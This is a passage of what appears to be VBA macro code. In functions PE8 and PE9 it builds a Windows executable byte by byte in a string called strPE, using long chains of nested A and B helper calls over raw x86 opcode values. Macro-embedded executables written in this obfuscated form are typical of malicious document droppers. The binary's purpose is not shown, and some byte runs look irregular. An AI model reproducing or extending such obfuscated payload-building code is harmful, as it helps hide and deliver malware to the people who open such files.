    strPE = B(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(strPE, 139), 207), 137), 182), 8), ";"), 200), "v"), 3), 195), "C"), 8), 139), "C"), 12), 133), 196), "t"), 6), 203), 232), 175), "R"), 0), 0), 139), "N"), 24), 199), "h"), 0), 0), 0), 0), 137), "N"), 1), 139), "~"), 221), 139), "="), 16), 137), "6"), 137), "v"), 4), 141), "G")
    strPE = B(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(B(strPE, "@"), 137), "G4"), 137), 213), "*"), 137), "_"), 24), 139), "]j"), 137), "w0"), 248), "w,3"), 246), 161), "O"), 205), ";*"), 220), "w"), 4), 137), "w"), 16), 137), "w"), 20), 137), "w8"), 137), 138), "|"), 137), "/"), 28), 137), "w"), 133), 137), "*(")
    strPE = B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(strPE, 137), 31), "tb"), 139), "(0"), 26), 232), "i"), 156), ">"), 230), 128), 227), 248), "E"), 198), "t"), 9), "P"), 232), 218), "A"), 0), 6), 139), 150), 16), 139), "K"), 4), 189), 195), 4), 141), "W"), 8), "c"), 206), 137), 180), "t"), 3), 137), "Q"), 12), 137), ";;")
    strPE = A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(strPE, 198), 137), "_"), 12), "tOP"), 232), "|R"), 0), "B"), 139), 221), "!"), 137), "8_"), 232), "3"), 1), "[]"), 194), 16), 0), 139), "E"), 16), 133), 192), "t"), 7), "j"), 12), 255), 208), 131), 196), 4), "}^"), 184), 12), 0), 0), 0), "[]"), 194)
    strPE = A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(strPE, 16), 0), 137), 27), 8), 135), "w"), 12), 139), "j"), 8), 137), "8_^3%[]"), 194), 16), 0), 25), 144), 144), 173), 144), 144), 144), 170), 144), 192), 26), 219), 236), 131), 236), "*S/W"), 139), "3"), 21), 137), "}"), 236), "+"), 219), 139)
    strPE = A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(strPE, "G,"), 137), 217), 232), 139), "H"), 171), 137), "M"), 224), 139), "P"), 20), "J"), 198), "E"), 240), 169), 137), "U"), 228), 137), "]"), 244), 139), "H"), 16), 139), "P"), 20), ";"), 2), "u"), 215), 139), "U"), 151), "R"), 232), 162), "#"), 206), 138), 131), 196), 4), 131), 248), 22)
    strPE = A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(strPE, "u"), 128), 139), "G6;"), 156), 230), ";"), 143), 12), 145), 138), 131), 196), 4), "3"), 192), "_^["), 139), 229), "]"), 194), 12), 0), 196), "E"), 16), 139), "M"), 12), "P"), 141), "U"), 224), 243), 247), "hlS@"), 0), 232), 251), 30), 0), 0), 131)
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(strPE, 248), 255), "u"), 25), 139), 18), " "), 193), "!6tj"), 217), 255), 208), 244), 196), 4), "_"), 226), "3"), 192), 5), 139), 229), "]"), 194), 12), "5"), 139), "EG"), 198), "/"), 0), 139), "M"), 232), 139), 0), 16), "+"), 194), 137), "U"), 16), 23), 192), 8), 158)
    strPE = A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 29), 3), "{"), 137), 26), 16), 139), 222), 21), 193), 243), 15), 132), 160), 0), 0), 0), 139), 241), 24), 139), "G"), 12), 133), 192), "t"), 6), "P"), 232), 167), 142), 0), 0), 139), "W"), 4), 225), 15), 137), "U"), 252), 139), "W"), 8), 137), "M"), 12), 139), "$"), 139)
    strPE = A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(strPE, "M"), 252), 137), "E"), 248), 139), "Fh"), 133), 201), 227), 180), ";"), 194), "v"), 159), 137), 30), 139), 222), 235), "/"), 131), "_"), 20), "s"), 24), 139), "L"), 135), 20), 133), 201), 137), 14), 203), 8), ";E"), 12), 188), 3), 133), "l"), 245), 137), "t"), 135), 20), 235)
    strPE = B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(strPE, 8), 12), "O"), 20), 137), 14), 137), "w"), 24), ";b"), 168), 4), "<"), 208), 235), 2), "?"), 210), 139), "u"), 248), 133), 246), "u"), 177), 139), "EO"), 137), "W"), 8), 150), 7), 139), 127), 12), "j"), 255), "t"), 6), "W"), 9), 165), "P"), 0), 175), 133), "+t")
    strPE = B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(strPE, 202), 139), "5"), 193), 193), "@"), 0), 139), 195), 139), 27), "P3"), 214), 131), 148), 137), 133), 219), "u"), 242), 139), "Ug"), 139), "}"), 8), 138), "E"), 240), 132), 192), "u"), 11), 173), "^"), 139), 141), "["), 139), 229), "]"), 194), 202), 244), 139), "M"), 232), 139), "G")
    strPE = A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(strPE, ","), 205), 24), 254), 0), 0), 0), 0), 139), "P"), 4), 201), "Q"), 253), 174), 228), 137), 1), 242), "H"), 4), 137), 206), ","), 139), "H"), 20), "1X"), 16), 139), "0+"), 203), "&"), 193), 0), 174), 0), 0), 139), 214), "'"), 225), 0), 240), 171), 138), ")"), 193)
    strPE = B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(strPE, 249), 12), "yW"), 3), 139), "zN"), 138), 207), ",!"), 139), 18), ";J"), 12), "r"), 249), 139), "H"), 4), 193), "1"), 139), 8), 139), "p"), 4), 137), "q"), 4), 139), "J"), 4), 137), "H"), 4), 137), 1), 137), 16), 137), "B"), 4), 139), 205), 2), "_^")
    strPE = A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(strPE, "["), 139), 231), "]"), 194), 12), 0), 144), 144), 144), 144), 144), "U"), 139), 181), 131), "^"), 16), 139), "U"), 8), 228), "VWmZ"), 136), 139), 150), 139), "z"), 26), "|C"), 16), 137), "E"), 213), 141), 12), 0), 131), 249), " s"), 5), 185), "a"), 0), 0)
    strPE = A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(strPE, 5), 128), "z"), 16), 142), 210), 3), "u{"), 139), "p"), 20), "+p"), 16), ";"), 206), "wq"), 139), "S"), 4), 139), "0"), 137), "k"), 139), 8), 139), "p"), 4), 137), "q"), 4), 139), "K"), 4), 137), "H"), 4), 227), 1), "*"), 246), 137), "C"), 4), 199), "@"), 12)
    strPE = B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(strPE, 156), "T"), 0), 0), 137), "G,UD"), 193), "sK"), 16), 139), "3+"), 193), 247), 206), 5), 0), 16), 6), 0), "%"), 0), 240), 255), 200), "He"), 248), 12), 137), "C"), 12), 28), "A"), 12), "s!"), 139), "p"), 227), "A"), 12), "r"), 137), 139), "C")
    strPE = B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(strPE, 4), "b0}"), 3), 139), "s"), 4), 137), "p"), 4), 139), "AJ"), 137), "C"), 4), 137), 24), 137), 11), 137), "Y"), 4), 139), "Gj"), 233), "\"), 0), 0), 0), 139), "w"), 24), 141), 129), 23), 195), 0), 205), "%"), 246), 189), 255), 255), ";"), 193), 28), "9")
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(strPE, 187), 15), ";"), 182), 1), 205), 0), "="), 0), 211), 0), 0), "s"), 198), 199), "E"), 252), "E"), 130), 0), 149), 139), 246), 252), 139), 30), 193), 183), 12), "O"), 144), 255), 255), 137), "}"), 248), 222), 135), 154), 1), 140), 0), ";>"), 15), 135), 231), 0), 0), 168)
    strPE = A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(B(A(strPE, 139), "F"), 12), "I"), 192), "tQP"), 138), 149), "N"), 0), 178), 131), "|<"), 237), "^"), 204), 14), 141), "D"), 190), 20), 139), 215), 137), "U"), 248), "u"), 16), ";"), 209), "s"), 9), 131), 192), 4), "{"), 131), "8"), 0), "t"), 243), 137), "U"), 248), 139), 16), 133)
    strPE = B(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(strPE, 178), 137), "U"), 240), 15), 132), "b"), 0), 185), "g"), 139), 199), "~"), 255), 137), "8"), 3), 22), "9"), 159), 248), "r"), 17), 139), "x"), 240), 131), 232), 4), "V7"), 255), "u"), 4), 133), 201), "w"), 241), 137), "r"), 139), "J"), 8), 139), "F"), 8), 3), 193), 137), "F")
    strPE = A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(strPE, 8), 148), 22), 34), "F"), 191), "/;v"), 245), 137), "F"), 8), 139), "D"), 12), 133), 21), "t"), 9), "V"), 232), 148), 16), 0), 0), 139), 149), 240), 186), 228), 24), 199), "v"), 0), 0), "i"), 0), "q]"), 16), 139), 194), 139), "U"), 8), 138), "JJ"), 132)
    strPE = B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(strPE, 201), "/"), 8), 174), "J"), 20), 137), 11), 137), 143), 175), 198), "B"), 16), 129), 161), "M"), 244), 139), "s"), 145), 139), "x"), 16), 139), 217), 193), 233), 2), 195), 165), 139), 203), "j"), 225), 3), 243), 136), 137), "B"), 8), 139), 208), "Y"), 139), 243), "_"), 3), 206), "^")
    strPE = A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(strPE, 137), 28), 139), "@"), 20), "H["), 137), "G"), 4), 176), 28), 139), 229), "]"), 158), 203), "v"), 12), 133), 246), "t"), 234), "V"), 232), "-N"), 0), 0), 235), "A"), 139), 25), 20), 133), 201), "t"), 247), 139), "F"), 12), 133), 192), "to"), 195), 232), 167), "M"), 0)
    strPE = A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(strPE, 0), " U"), 8), 253), "A"), 20), 141), "F"), 20), 133), 255), "t"), 16), 139), "M"), 248), ";!"), 8), "vF"), 237), "A`?"), 133), 131), "u"), 188), 139), "v"), 12), 230), 143), "t"), 6), "_"), 232), 237), "L"), 0), 0), 139), "}"), 248), 139), "E"), 252), 212)
    strPE = A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(strPE, 255), 21), "\"), 27), 232), 0), 131), 196), 4), ")"), 192), "tY"), 139), "M"), 252), 141), 6), 24), 137), 2), 16), 199), 0), 0), 0), 0), 0), 141), 20), 8), 137), "x"), 8), 137), "P"), 183), 233), "9_"), 255), 255), 139), 15), 137), 8), 139), "G"), 8), 139)
    strPE = B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(strPE, "N"), 8), 3), 200), 139), "F"), 4), ";"), 200), 137), "ND?"), 3), "]F"), 8), 139), "v"), 12), 133), 246), "t"), 9), "V"), 232), 150), 239), 0), 0), 139), "U"), 8), 141), "O"), 24), 199), "H"), 151), 0), 139), 0), 229), "D"), 16), 139), 199), 135), 0), "W")
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 255), 255), "_^"), 131), 200), 255), "["), 139), 229), 128), 195), 144), 144), 144), 144), 144), 144), "U"), 139), 159), 139), "M"), 12), 139), "U7"), 141), "E"), 16), "8:R"), 232), "|"), 251), 255), 206), "]"), 195), 144), 144), 144), 27), 144), 144), 144), 144), 144), 144)
    strPE = A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(strPE, "U"), 139), 236), 139), "-"), 8), 139), "E"), 12), 137), "A(J"), 194), 8), 0), 19), 139), 236), "V"), 139), 29), 8), 133), 246), "t"), 216), 139), "F9"), 133), "~t"), 186), "S"), 4), 137), 31), 20), 204), 8), "N"), 16), 133), "H?"), 244), 255), 255), 139)

    PE8 = strPE
End Function

Private Function PE9() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(strPE, "U"), 12), 139), "M"), 16), 137), "P"), 4), 230), 219), 187), 137), "H"), 8), 137), 5), 12), 139), "N"), 16), 154), 8), 137), "F"), 16), "^]"), 194), 16), 0), "U"), 139), 236), "3"), 145), 16), 165), "'W"), 133), 210), "t_"), 139), "B"), 16), 139), 154), 16), 139)
    strPE = B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(B(strPE, "}"), 12), 141), "J"), 16), 133), 192), "t "), 231), "x"), 29), "us9p"), 29), "t"), 10), 139), 200), 139), 0), 133), 18), "u"), 238), 235), 12), 139), 24), "vx"), 139), 18), 20), 137), 8), 159), "B"), 20), 139), "B8"), 141), "J8u;t")
    strPE = A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(strPE, 20), "9x"), 4), "u"), 5), "9"), 210), 8), "t"), 15), 217), 250), 30), 0), 133), 192), "u"), 238), "_^[]"), 194), "A"), 0), 139), "0"), 137), "1"), 139), "\<"), 137), 8), 137), "B<_^["), 208), 194), 34), 164), 144), 144), 144), ";"), 205)
    strPE = A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(strPE, 255), "B"), 144), 144), 144), 144), 144), 144), "U"), 139), 236), 139), "E"), 8), "V"), 139), "u"), 16), "W"), 139), 201), 12), 242), "WP"), 143), "j:"), 185), 255), "W"), 255), 214), 131), 196), 134), "_^]"), 194), "n"), 0), 144), 144), 144), 144), 144), 144), 144), 144)
    strPE = A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(strPE, 133), 144), 144), 144), 144), 144), "U"), 139), 236), "V"), 139), "u"), 8), 139), 6), 133), 192), "t"), 20), 240), 8), 137), 14), "jP"), 4), 0), 255), "P"), 8), 139), 6), 131), 196), 4), ";"), 188), "u"), 236), "^]"), 195), 183), 144), 144), 144), 144), 245), 144), 144)
    strPE = A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(strPE, 144), "b"), 144), 10), "3"), 192), 195), 144), 144), 150), 144), 144), 144), 144), "!"), 198), 144), 144), 144), 144), "U"), 139), 144), 131), 236), 8), "S"), 139), "]"), 8), "W3"), 255), 133), 1), 205), 132), 249), 0), "|"), 0), "V"), 139), 243), 139), 6), "j"), 1), "j"), 0)
    strPE = B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(strPE, "j"), 0), "P"), 206), 171), 177), 0), 0), "=v"), 17), 1), 213), 252), "X"), 199), 139), 4), 1), 191), 0), "e"), 139), "v"), 8), 240), 128), "u"), 221), 139), 243), "b"), 207), 4), 133), 192), "t+"), 139), 159), 26), 179), 0), 0), 0), "j"), 9), "Q"), 137), "~")
    strPE = A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(strPE, 4), 232), "JL"), 0), 0), 139), "v"), 135), 133), 244), "u"), 224), 155), 255), "tu"), 187), 27), 183), "K"), 0), "VS"), 137), "u9"), 232), 192), 21), 0), 0), 139), "u"), 8), "3"), 255), 131), "~"), 202), 2), "u#"), 139), 22), "j"), 1), "j"), 0), 149)
    strPE = A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(strPE, 0), 172), 232), 247), 127), 0), 0), "="), 146), 17), "g"), 0), "1"), 7), 191), 143), 168), 0), 148), 235), 7), 199), "F"), 4), 0), 0), "c:"), 139), "v"), 8), 133), 246), "u"), 208), 254), 22), 195), 18), 139), "u"), 252), 133), "4"), 127), 159), "|"), 8), "]"), 251)
    strPE = B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(strPE, 167), 198), "-"), 143), 146), 229), "VS"), 232), "o"), 21), "%"), 0), "j"), 0), "j"), 10), "V"), 140), 232), "D]"), 0), 0), 139), 216), 137), 165), 252), 235), 199), 229), "]"), 157), 25), 243), 131), "~"), 4), 2), 221), 10), "Z"), 6), "j;"), 1), 232), 184), "K")
    strPE = A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(strPE, 167), 0), 139), "W"), 8), 133), 226), "C"), 233), 139), "4"), 139), "F"), 4), 133), 192), "t"), 14), 139), 14), "j"), 0), 4), 222), "j"), 0), 156), 232), "z"), 144), 0), 0), "kv"), 183), 133), 246), "U"), 228), "M_["), 139), ":]"), 195), 144), 144), 144), 144)
    strPE = B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(strPE, 144), 139), 144), 144), "/"), 144), 144), 144), "U"), 24), 236), "V"), 139), "u"), 12), "3"), 192), 133), 148), "t+W"), 139), 254), 131), 201), "W"), 242), 174), 139), "E"), 206), 247), 209), "I"), 139), 249), "GWP"), 232), 235), 241), 255), 255), 139), 207), 197), 248), "6")
    strPE = A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 209), 193), 233), 13), 243), 165), 139), 202), 131), 255), 3), 134), 164), "_^]"), 194), 8), 0), 144), 144), 144), "U"), 139), 236), 233), 236), "$S"), 19), "W"), 139), "}"), 12), "3"), 219), 226), 210), 133), 255), "t#"), 141), "u"), 12), 131), 201), 255), 143), 192)
    strPE = A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(strPE, 242), 128), 247), 209), "If"), 251), 178), "}v"), 4), "L"), 243), 220), "C"), 245), "~"), 4), 131), 198), "4"), 3), 249), 133), 255), "u"), 224), 139), "E"), 8), "eRP"), 232), 142), 240), 255), 255), 139), "u"), 12), "3"), 201), 133), 246), 137), "E"), 244), 219), 24)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(strPE, 137), "M"), 216), "tN"), 141), "E"), 12), 188), "E"), 248), 235), 3), 139), "M"), 252), 131), 249), "i}"), 133), "nD"), 141), 220), ")"), 137), "M"), 252), 19), 14), 139), 254), 131), 201), 255), "3v"), 242), 174), 247), 209), 134), 139), 193), 209), "U"), 139), 250), 139)
    strPE = A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 217), 3), 208), 193), 233), 2), 243), 165), 139), "Eoq"), 203), 131), 225), 3), 131), 192), 4), 243), 164), 139), "0"), 238), "E$"), 133), 246), "'"), 189), 139), "E"), 34), 162), "^"), 198), 2), 0), "["), 139), 229), "]"), 195), 255), 144), 8), 226), 144), "U"), 139)
    strPE = A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 137), 131), 236), 8), "f"), 139), 13), 200), 243), "@"), 187), 161), 196), 243), 174), 0), 138), 21), 202), 243), "@"), 0), "SV"), 139), "u"), 12), "V"), 137), "M"), 252), 139), "M"), 8), 133), 209), "W"), 137), "E"), 248), 155), "U"), 17), 141), "]"), 248), 127), 149), "|"), 4)
    strPE = A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(strPE, 133), 201), "s"), 31), 139), "E"), 192), 139), "C"), 149), 243), "@"), 0), 139), "R_^n"), 137), 17), 138), 21), 192), 243), "@"), 155), "h~"), 4), 239), 229), 2), 194), 12), 0), 133), 246), 127), "b'"), 8), 129), 249), 205), "<"), 0), 0), "s#"), 139)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(strPE, "u"), 16), "Qh"), 21), 243), "@"), 0), "j"), 5), "V"), 19), 202), ",6I"), 131), 196), 16), 133), 3), 139), 207), 15), 141), 229), 226), 0), 0), 233), 205), 0), 0), 0), 139), 249), 139), 193), 139), 214), 185), 10), 0), 0), 0), 4), 231), 255), 3), 0)
    strPE = A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(strPE, 0), 232), "2"), 173), 0), 175), 139), 242), 139), "r"), 133), 193), "|p"), 127), 8), 129), 249), 205), 3), 140), "Rr"), 3), "C"), 235), "@"), 133), 246), "|_"), 127), 5), "Y"), 249), 9), "rX"), 131), 249), "ru"), 12), 133), 246), 27), 8), 129), 20), 237)
    strPE = A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(strPE, 3), 216), 0), "|G"), 129), 255), 10), 2), 0), 0), "|"), 174), 131), 193), 1), 131), 214), 182), 15), 190), ")"), 139), "u"), 219), "PQh"), 172), 243), 23), 0), "j"), 5), "V"), 232), 210), ",W"), 0), 131), 221), 20), 133), 25), "}m"), 213), 21), 164)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(strPE, 243), "@"), 0), 139), 206), "_"), 150), 17), 160), 199), 243), 251), 0), 223), "J"), 4), 236), "p^["), 139), 229), "]"), 172), 12), 0), 141), 160), 191), "m"), 1), 0), 0), 153), 129), 226), 255), 1), 0), 0), 3), 194), 193), 248), 9), 131), 151), 10), "|"), 8)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(strPE, 131), 193), 1), 131), 214), 0), "3"), 192), 239), 190), "q"), 139), "u"), 16), "RPQ^"), 231), 243), 202), 0), "j"), 5), "V"), 232), 244), "+"), 0), "8"), 131), 196), 24), 133), 192), "}"), 19), 139), 198), 230), 13), 164), 243), "@"), 0), 137), 8), 195), 21), 168)
    strPE = A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(strPE, 243), 4), 0), 136), "P"), 4), "hC"), 166), "^["), 139), 229), "]"), 194), 12), 0), 144), 144), 144), 144), 144), 144), 242), 144), 144), 144), "."), 144), 144), "C"), 219), 169), 139), 236), "SV"), 139), "u"), 181), 154), "jCV("), 143), 20), 170), 180), 254)
    strPE = A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(strPE, "]"), 8), 139), 21), 128), 193), "@"), 0), 139), "}"), 16), 137), 3), "M0"), 139), 3), 199), "@"), 20), 0), 0), 0), 0), 139), 11), "ii"), 4), 161), 200), 192), "@bq"), 188), 131), 192), "@"), 137), "A"), 8), 139), 19), "Y"), 12), 189), 4), 0), 9)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(strPE, 145), 199), "BH"), 212), 2), "A"), 25), 139), 3), "QV"), 137), 212), 24), 232), "H"), 239), 255), 179), 139), "u7"), 141), 178), 189), "D"), 0), 0), 0), 137), "M"), 12), 139), 209), 139), 248), "K"), 233), 2), 243), 21), "q"), 202), 131), 238), 3), 243), 164), 139)
    strPE = B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(strPE, 11), 210), "-"), 137), "A"), 28), 139), "k"), 139), 221), 12), 139), "B"), 28), 199), 4), "u"), 237), "x"), 0), 229), 139), 19), 163), 1), 254), 0), 0), 199), "y$"), 0), 0), 0), 0), 139), 135), 137), 138), 127), 139), 19), 137), 4), "("), 224), 11), "V"), 137), "A")
    strPE = B(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(strPE, ","), 210), 192), "]"), 194), 16), 0), "SU"), 139), "&V"), 139), 138), 8), 250), 174), "F"), 20), 133), 192), "u"), 8), 139), "F "), 128), 232), 0), "uO"), 139), "N"), 12), 139), "F"), 24), ";"), 200), 199), "Fo"), 0), 0), "K"), 0), "}"), 16), 139), "V")
    strPE = B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(strPE, 28), 139), 4), 138), 137), "& "), 128), "8-$"), 22), 138), "P"), 1), "@"), 179), 173), "t("), 146), "F "), 138), 128), 201), "S-u"), 30), "A"), 137), "N"), 12), 199), "F "), 212), 2), "A"), 0), 139), "M"), 16), 241), "F"), 137), "U^b")
